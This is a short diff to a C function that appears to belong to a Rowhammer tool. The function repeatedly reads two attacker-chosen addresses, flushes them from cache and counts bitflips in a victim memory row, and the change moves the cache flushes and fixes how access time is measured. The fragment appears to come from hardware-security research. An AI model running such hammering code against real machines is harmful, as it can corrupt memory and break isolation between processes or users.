@@ -24,15 +24,14 @@ uint32_t hammer_addresses(uint64_t vict_virt_addr, uint64_t attacker_virt_addr_1
         asm volatile(
             "mov (%0), %%rax\n\t"
             "mov (%1), %%rax\n\t"
-            "clflush (%0)\n\t"
-            "clflush (%1)\n\t"
-            "mfence\n\t"
             :
             : "r" (attacker_virt_addr_1), "r" (attacker_virt_addr_2)
             : "rax"
         );
         uint64_t end = rdtscp();
-        measures = start - end;
+        measures += end - start;
+        clflush(attacker_virt_addr_1);
+        clflush(attacker_virt_addr_2);
     }
     uint32_t number_of_bitflips_in_target = 0;
     for (uint32_t index = 0; index < ROW_SIZE; index++) {
